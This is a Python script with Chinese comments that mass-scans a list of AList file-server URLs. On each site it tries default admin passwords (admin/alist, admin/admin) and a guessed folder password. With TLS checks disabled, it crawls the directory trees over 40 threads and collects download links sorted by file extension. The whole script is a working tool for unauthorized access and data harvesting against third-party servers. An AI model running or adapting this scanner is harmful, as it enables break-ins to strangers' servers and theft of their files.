import requests
import os
import concurrent.futures
from collections import deque
from datetime import datetime
import pytz
import sys

# === 核心参数配置 ===
INPUT_FILE = 'duplicate.txt'
OUTPUT_DIR = 'scan_results'
MAX_THREADS = 40
TIMEOUT = 5
MAX_DEPTH = 3

WEAK_PASSWORDS = [
    {"username": "admin", "password": "alist"},
    {"username": "admin", "password": "admin"},
]

def get_auth_token(base_url, session):
    login_url = f"{base_url.rstrip('/')}/api/auth/login"
    for payload in WEAK_PASSWORDS:
        try:
            r = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            if r.status_code == 200 and r.json().get("code") == 200:
                return r.json().get("data", {}).get("token")
        except:
            continue
    return None

def get_alist_list(base_url, path, token, session):
    api_url = f"{base_url.rstrip('/')}/api/fs/list"
    headers = {"Authorization": token} if token else {}
    payload = {"path": path, "password": "alist", "page": 1, "per_page": 0}
    try:
        resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
        data = resp.json()
        if data.get("code") == 200:
            return data.get("data", {}).get("content", [])
        elif data.get("code") in [401, 500]:
            payload["password"] = ""
            resp = session.post(api_url, json=payload, headers=headers, timeout=TIMEOUT, verify=False)
            data = resp.json()
            if data.get("code") == 200:
                return data.get("data", {}).get("content", [])
    except:
        pass
    return []

def process_url(url, session):
    print(f"-> 尝试扫描: {url}", flush=True)
    token = get_auth_token(url, session)
    local_data = []
    queue = deque([("/", 0)])
    visited_paths = {"/"}
    
    try:
        while queue:
            current_path, depth = queue.popleft()
            if depth > MAX_DEPTH:
                continue
            items = get_alist_list(url, current_path, token, session)
            if not items:
                continue
            for item in items:
                name = item.get('name')
                full_path = f"{current_path.rstrip('/')}/{name}"
                if item.get('is_dir'):
                    if full_path not in visited_paths:
                        visited_paths.add(full_path)
                        queue.append((full_path, depth + 1))
                else:
                    _, ext = os.path.splitext(name)
                    ext = ext.lower().replace('.', '') if ext else "no_ext"
                    if ext in ['js', 'css', 'html', 'json', 'png', 'jpg', 'svg', 'ico', 'woff', 'woff2']:
                        continue
                    download_url = f"{url.rstrip('/')}/d{full_path}"
                    local_data.append((ext, name, download_url))
    except Exception as e:
        print(f"站点 {url} 出错: {e}", flush=True)
        
    return local_data

def main():
    print(">>> 启动主程序...", flush=True)
    requests.packages.urllib3.disable_warnings()
    
    if not os.path.exists(INPUT_FILE):
        print(f"错误: 找不到 {INPUT_FILE}", flush=True)
        return

    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        urls = list(set([line.strip() for line in f if line.strip().startswith('http')]))

    if not urls:
        print("警告: duplicate.txt 中没有发现有效的 URL", flush=True)
        return

    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    final_registry = set()
    total = len(urls)
    print(f"=== 任务启动: 总计 {total} 个站点 ===", flush=True)

    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS*2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # 注意这里传了 session
        future_to_url = {executor.submit(process_url, url, session): url for url in urls}
        done_count = 0
        for future in concurrent.futures.as_completed(future_to_url):
            done_count += 1
            if done_count % 10 == 0 or done_count == total:
                print(f"进度报告: 已扫描 {done_count}/{total}...", flush=True)
            try:
                res = future.result()
                if res:
                    for item in res:
                        final_registry.add(item)
            except:
                pass

    # 分类保存逻辑
    ext_map = {}
    for ext, name, d_url in final_registry:
        if ext not in ext_map:
            ext_map[ext] = []
        ext_map[ext].append(f"{name} | {d_url}")

    shanghai_tz = pytz.timezone('Asia/Shanghai')
    now_str = datetime.now(shanghai_tz).strftime("%Y-%m-%d %H:%M:%S")

    for ext, lines in ext_map.items():
        file_path = os.path.join(OUTPUT_DIR, f"{ext}.txt")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(f"# 更新时间: {now_str}\n\n")
            for line in sorted(lines):
                f.write(line + "\n")

    print(f"=== 任务圆满完成! 发现文件分类: {len(ext_map)} 类 ===", flush=True)

if __name__ == "__main__":
    main()
